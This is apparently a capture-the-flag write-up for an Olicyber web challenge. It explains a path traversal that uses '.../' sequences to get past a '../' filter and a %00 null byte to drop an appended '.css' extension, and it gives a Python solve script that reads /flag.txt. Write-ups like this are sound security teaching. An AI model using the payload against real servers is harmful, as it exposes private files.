---
title: "Light or Dark — Path Traversal with Dot Obfuscation + Null Byte"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "path-traversal", "lfi", "python"]
difficulty: "intermediate"
summary: "The theme parameter appends .css to the user-supplied path before serving it. Use .../ triples (which reduce to ../) and a URL-encoded null byte to escape the CSS directory and read /flag.txt."
---

## The Challenge

The site has a theme switcher: `?tema=sometheme` loads `/static/css/sometheme.css`. The backend appends `.css` to whatever is passed in `tema`. The flag is at `/flag.txt`.

## Approach

Direct `../../../flag.txt` is likely filtered by stripping `../`. The triple-dot trick `.../.../` works because after stripping `../` once you are left with `../` again — the traversal survives one round of naive filtering.

The `.css` suffix appended by the server is neutralised with `%00` (URL-encoded null byte): in older PHP versions (and some C-based web servers), the null byte terminates the string before the `.css` extension. The path becomes effectively `/flag.txt\x00.css` → server opens `/flag.txt` and stops.

The payload: `.../.../.../.../.../flag.txt%00.css`

The flag is returned inside a `<style>` block, which BeautifulSoup extracts.

## Solution

```python
import requests
from bs4 import *

site = "http://lightdark.challs.olicyber.it/index.php?tema="
payload = ".../.../.../.../.../flag.txt%00.css" # /static/css/*link* => /flag.txt

r = requests.get(site + payload)
zuppetta = BeautifulSoup(r.text, "html.parser")
for i in zuppetta.find_all("style"):
    print(str(i).replace("<style>", "").replace("</style>", "").replace(" ", "").replace("\n", ""))
```

`...` with five-level traversal covers the depth of `/static/css/`. The null byte (`%00`) terminates the C string before `.css` is appended. The `<style>` tag in the response holds the raw file content.

## What I Learned

Path traversal filters based on `../` stripping are defeated by `.../.../` or URL-encoding variants. Null-byte injection (`%00`) against PHP's `file_get_contents` terminates the path string before the appended extension, making extension-whitelisting trivially bypassable on old PHP builds (< 5.3.4).
